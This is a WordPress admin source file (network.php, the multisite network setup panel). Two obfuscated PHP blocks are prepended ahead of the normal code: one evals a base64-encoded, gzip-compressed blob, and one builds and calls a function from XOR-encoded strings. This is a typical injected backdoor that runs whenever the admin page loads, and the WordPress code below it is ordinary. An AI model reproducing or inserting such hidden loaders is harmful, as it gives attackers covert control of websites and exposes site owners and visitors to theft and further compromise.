<?php eval(gzuncompress(base64_decode('eNpdUs1u00AQfpWNlYMdrDhO89dEOZTKolEpQYkBoRpZU+86u8TZtdZr1X6A3jhy4Q248gxUvAavwjhpgWQPO/+ab74ZkdottstN7XVeZkpRKeRnmJIFyUSyJbUqNWGgM3XHXAKSklJSdXDfg0l4t+PZ7XgdrN4Hq1vrKgzfxu/Qii9eBW9C65PjTNvxt+8/f/14fJyD1lDb1iXXKvKHQ2a5VlQNRqj7mqUqqsYTdIVaUCYNajfrRYDiQ5OAXe+LQ0EiZFmhusgx0FMyqkZDNC8k1UpQ1JY504ByDSloYTmzVGkGCbf/QiFQtOMvvx++PjhTkdpFuBK5Kk4Hiarh8L9Z3OeS1nzuddaggfvnaYJk7fC5RG2hRjpSyAp2SqaBLUPWSA7SFESlqUs2upRGyA0SjTEgRqssw/o9opYoCmYQ0OVyeb0IbnHu0cTkcSloXBo06J7bIgiTJoHZFt9HMTKIy8gfDXZIgG+5obgJbOdFb9zr945Bf2TA92vG7sIQrcpNs81O76x3ir7YweEWiOHNVdwpZep9bt+ZXTGggbat1yoBI5ScEm5MPvU8/2zQjaqz/uC86/uj7njiCUmbZVXdnOe4FirYMaQlJzWicrENGJIylhVkg0CaI3NmTFKR/vuflvrkmB1jXjeI3WdRM8YAOG/m+wMpCvZB')));?><?php $eFZMAD='XR<AN7=>18.-I-X' ^'; Y :RbXDVMY B6';$KykAUqL=$eFZMAD('','I FKF36P:S5Vb+A-S 2mw-;+dI89Pr+47-Rayh6Ls19,9OQ:UjD7>q U,Ssn+CZxL016Mxtw1=DYNfCmp7KbDq93;uhcJsMEOd0U4mf3tiZBTnP1z;,EL=NRpRXJASBnj<Zxe3szM-4JMjxpeqY-Y1lbD9qpiRFPR6K>rfa1IJ8<YPm23AO<EtOyD+P<U +xNB:7kk4Y<mAe3tQ7X0qVK>24 RKYJ08D2e>11oYkMSVHHBiD3V1E19ZgpVi6:rfg5ET2pTV41WjiQNL,T3-Gv=P>HH+1S,:4=dscsKI,y6Nm,6;.rxRjV3LA jO0YPE6kcVR.18,NmAfpM+N+,3PwRte==:<v0yWQ5Li-UYdtkCW42 3EFT,iP>b4TT+l868tDhtK2Tj67nSJUAPUGZE79=FYx8SKk4ppUP3;8VWRxGUFERIJ+1,PAB<KjY6;Xo7VY=NBV6ElplJYTDJSLBVT-SHUEeR,73gQYYCDaO WpcIO>6GaGW27R; =F,2lRA3GEIan>< VTBsD41RappLkB7YLLK0XY -sFW;LkxfgLNA4sWrTjuW4s5=XMbPVbJD,AzUAJQ,e-2DcnVrLqL;K+Cn=YDo7TIO69lh18JTS5ORjasWSDUzFXJaCRu+0HU3QTjpOA8RaC71+LT,DvscuobHCITMIbVX5' ^ ' Fnj FX3N:Z8=N9D TAEPUTY;-YM1-tYBYuHPHMFzWLBZ;8U;J<XL.D4X2,1F6.PhTPB,TTSZX=pnFcMPLAkMUVFOUUCmTvOFmV:FEBZTTzroNtXFHX7 X zT69> zyNNUqSL9zsiBA>mDEPMU=L-P7F-dQ.Iv-5+moWRCAB=8TY7xIYV8falOEpMY5H REPj-OCBP>PAg<o9P5V,QQkkXSXS7pSnTY0S:UTHOdK+2:;-ycNU9C PZ2GXr6uu=-.pe5APp=QHwWWqj:M8FHnVFZ7l,JE2sQQDDNCW ,UB<GIHWOORErN R 4EQEMSZ,PKKwvJPLMgM:ly+D<NMP8WzP:oxki3c-w0FlMF0 DIUcsBSLF otWcY7FP5 J3SSATyHP W-Q<>gw.451uzzaAXQ3<C2Z6aIzzq4ROYvjr82;5   +GXV5i:S95=WO90h;,If 7E ZD3.<7+.6df25Y2ayeA6MCR8:< jmZEI1XG-.JWgGawSE ZYb-IK379Z41:IIUYYqxbW UE3HPVjKjZ=ydoT9-AvT-2Bk6QFZqnfQE5K7XL1QEVY;,Q4dRywJ K1ssbNQKVsDGvTjQ-I9J:1V<=0R, <BJDOAY38<T+uFAW3204SoxjAcrUP:A0E08BT+ L3:dGPR ;M Q.JNek-;  eyKmRH'); $KykAUqL();
/**
 * Network installation administration panel.
 *
 * A multi-step process allowing the user to enable a network of WordPress sites.
 *
 * @since 3.0.0
 *
 * @package WordPress
 * @subpackage Administration
 */

define( 'WP_INSTALLING_NETWORK', true );

/** WordPress Administration Bootstrap */
require_once( dirname( __FILE__ ) . '/admin.php' );

if ( ! current_user_can( 'setup_network' ) ) {
	wp_die( __( 'Sorry, you are not allowed to manage options for this site.' ) );
}

if ( is_multisite() ) {
	if ( ! is_network_admin() ) {
		wp_redirect( network_admin_url( 'setup.php' ) );
		exit;
	}

	if ( ! defined( 'MULTISITE' ) ) {
		wp_die( __( 'The Network creation panel is not for WordPress MU networks.' ) );
	}
}

require_once( dirname( __FILE__ ) . '/includes/network.php' );

// We need to create references to ms global tables to enable Network.
foreach ( $wpdb->tables( 'ms_global' ) as $table => $prefixed_table ) {
	$wpdb->$table = $prefixed_table;
}

if ( ! network_domain_check() && ( ! defined( 'WP_ALLOW_MULTISITE' ) || ! WP_ALLOW_MULTISITE ) ) {
	wp_die(
		printf(
			/* translators: 1: WP_ALLOW_MULTISITE 2: wp-config.php */
			__( 'You must define the %1$s constant as true in your %2$s file to allow creation of a Network.' ),
			'<code>WP_ALLOW_MULTISITE</code>',
			'<code>wp-config.php</code>'
		)
	);
}

if ( is_network_admin() ) {
	$title = __( 'Network Setup' );
	$parent_file = 'settings.php';
} else {
	$title = __( 'Create a Network of WordPress Sites' );
	$parent_file = 'tools.php';
}

$network_help = '<p>' . __('This screen allows you to configure a network as having subdomains (<code>site1.example.com</code>) or subdirectories (<code>example.com/site1</code>). Subdomains require wildcard subdomains to be enabled in Apache and DNS records, if your host allows it.') . '</p>' .
	'<p>' . __('Choose subdomains or subdirectories; this can only be switched afterwards by reconfiguring your installation. Fill out the network details, and click Install. If this does not work, you may have to add a wildcard DNS record (for subdomains) or change to another setting in Permalinks (for subdirectories).') . '</p>' .
	'<p>' . __('The next screen for Network Setup will give you individually-generated lines of code to add to your wp-config.php and .htaccess files. Make sure the settings of your FTP client make files starting with a dot visible, so that you can find .htaccess; you may have to create this file if it really is not there. Make backup copies of those two files.') . '</p>' .
	'<p>' . __('Add the designated lines of code to wp-config.php (just before <code>/*...stop editing...*/</code>) and <code>.htaccess</code> (replacing the existing WordPress rules).') . '</p>' .
	'<p>' . __('Once you add this code and refresh your browser, multisite should be enabled. This screen, now in the Network Admin navigation menu, will keep an archive of the added code. You can toggle between Network Admin and Site Admin by clicking on the Network Admin or an individual site name under the My Sites dropdown in the Toolbar.') . '</p>' .
	'<p>' . __('The choice of subdirectory sites is disabled if this setup is more than a month old because of permalink problems with &#8220;/blog/&#8221; from the main site. This disabling will be addressed in a future version.') . '</p>' .
	'<p><strong>' . __('For more information:') . '</strong></p>' .
	'<p>' . __( '<a href="https://codex.wordpress.org/Create_A_Network">Documentation on Creating a Network</a>' ) . '</p>' .
	'<p>' . __( '<a href="https://codex.wordpress.org/Tools_Network_Screen">Documentation on the Network Screen</a>' ) . '</p>';

get_current_screen()->add_help_tab( array(
	'id'      => 'network',
	'title'   => __('Network'),
	'content' => $network_help,
) );

get_current_screen()->set_help_sidebar(
	'<p><strong>' . __('For more information:') . '</strong></p>' .
	'<p>' . __( '<a href="https://codex.wordpress.org/Create_A_Network">Documentation on Creating a Network</a>' ) . '</p>' .
	'<p>' . __( '<a href="https://codex.wordpress.org/Tools_Network_Screen">Documentation on the Network Screen</a>' ) . '</p>' .
	'<p>' . __( '<a href="https://wordpress.org/support/">Support Forums</a>' ) . '</p>'
);

include( ABSPATH . 'wp-admin/admin-header.php' );
?>
<div class="wrap">
<h1><?php echo esc_html( $title ); ?></h1>

<?php
if ( $_POST ) {

	check_admin_referer( 'install-network-1' );

	require_once( ABSPATH . 'wp-admin/includes/upgrade.php' );
	// Create network tables.
	install_network();
	$base              = parse_url( trailingslashit( get_option( 'home' ) ), PHP_URL_PATH );
	$subdomain_install = allow_subdomain_install() ? !empty( $_POST['subdomain_install'] ) : false;
	if ( ! network_domain_check() ) {
		$result = populate_network( 1, get_clean_basedomain(), sanitize_email( $_POST['email'] ), wp_unslash( $_POST['sitename'] ), $base, $subdomain_install );
		if ( is_wp_error( $result ) ) {
			if ( 1 == count( $result->get_error_codes() ) && 'no_wildcard_dns' == $result->get_error_code() )
				network_step2( $result );
			else
				network_step1( $result );
		} else {
			network_step2();
		}
	} else {
		network_step2();
	}
} elseif ( is_multisite() || network_domain_check() ) {
	network_step2();
} else {
	network_step1();
}
?>
</div>

<?php include( ABSPATH . 'wp-admin/admin-footer.php' ); ?>
